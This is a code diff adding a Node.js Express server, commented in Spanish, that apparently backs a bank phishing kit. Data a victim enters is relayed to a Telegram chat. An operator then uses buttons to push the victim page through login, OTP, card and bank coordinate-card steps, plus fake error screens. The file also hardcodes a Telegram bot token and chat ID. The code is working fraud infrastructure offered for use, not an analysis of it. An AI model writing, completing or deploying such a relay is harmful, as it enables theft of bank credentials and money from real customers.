@@ -1,0 +1,123 @@
+const express = require('express');
+const fetch = require('node-fetch');
+const path = require('path');
+
+const app = express();
+app.use(express.json());
+app.use(express.static(__dirname));
+
+const TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
+const CHAT_ID = process.env.CHAT_ID || "-1003027102929";
+
+// ── ESTADO PERSISTENTE (aquí sí funciona porque es un servidor real) ──
+let lastUpdateId = 0;
+let waitingForCoords = false;
+let pendingCoords = null;
+
+// ── SEND ──
+app.post('/api/send', async (req, res) => {
+  try {
+    const { text, buttons } = req.body;
+    const payload = { chat_id: CHAT_ID, text, parse_mode: "HTML" };
+    if (buttons && buttons.length) payload.reply_markup = { inline_keyboard: buttons };
+
+    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+    const data = await r.json();
+    res.json({ ok: true, data });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+// ── POLL ──
+app.get('/api/poll', async (req, res) => {
+  try {
+    // Si hay coords pendientes, mandarlas y limpiar
+    if (pendingCoords) {
+      const coords = pendingCoords;
+      pendingCoords = null;
+      waitingForCoords = false;
+      return res.json({ ok: true, action: 'bancontrol', coords, update_id: lastUpdateId });
+    }
+
+    const r = await fetch(
+      `https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=3&allowed_updates=["callback_query","message"]`
+    );
+    const data = await r.json();
+
+    if (!data.ok || !data.result.length) {
+      return res.json({ ok: true, action: null, waitCoords: waitingForCoords, update_id: lastUpdateId });
+    }
+
+    for (const update of data.result) {
+      lastUpdateId = update.update_id;
+
+      // MENSAJE DE TEXTO — coords del bancontrol
+      if (update.message?.text) {
+        const txt = update.message.text.trim();
+        if (txt.startsWith('/')) continue;
+
+        if (waitingForCoords) {
+          const parts = txt.toUpperCase().split(/\s+/);
+          if (parts.length >= 2) {
+            waitingForCoords = false;
+            pendingCoords = null;
+            return res.json({
+              ok: true,
+              action: 'bancontrol',
+              coords: [parts[0], parts[1]],
+              waitCoords: false,
+              update_id: lastUpdateId
+            });
+          }
+        }
+        continue;
+      }
+
+      // CALLBACK QUERY — botones
+      const cb = update.callback_query;
+      if (!cb) continue;
+      const cbData = cb.data;
+
+      await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ callback_query_id: cb.id, text: "✅ Enviado al cliente" }),
+      });
+
+      if (cbData === "bancontrol") {
+        waitingForCoords = true;
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: cb.message.chat.id,
+            text: `🏦 *BANCONTROL*\n\nEscribe las 2 coordenadas separadas por espacio:\n\nEjemplo: \`D1 D2\``,
+            parse_mode: "Markdown",
+          }),
+        });
+        return res.json({ ok: true, action: null, waitCoords: true, update_id: lastUpdateId });
+      }
+
+      if (cbData === "otp")              return res.json({ ok: true, action: "otp",              update_id: lastUpdateId });
+      if (cbData === "tarjeta")          return res.json({ ok: true, action: "tarjeta",          update_id: lastUpdateId });
+      if (cbData === "error_login")      return res.json({ ok: true, action: "error_login",      update_id: lastUpdateId });
+      if (cbData === "error_otp")        return res.json({ ok: true, action: "error_otp",        update_id: lastUpdateId });
+      if (cbData === "error_tarjeta")    return res.json({ ok: true, action: "error_tarjeta",    update_id: lastUpdateId });
+      if (cbData === "error_bancontrol") return res.json({ ok: true, action: "error_bancontrol", update_id: lastUpdateId });
+      if (cbData === "finalizar")        return res.json({ ok: true, action: "finalizar",        update_id: lastUpdateId });
+    }
+
+    return res.json({ ok: true, action: null, waitCoords: waitingForCoords, update_id: lastUpdateId });
+
+  } catch (err) {
+    res.status(500).json({ ok: false, action: null, error: err.message });
+  }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
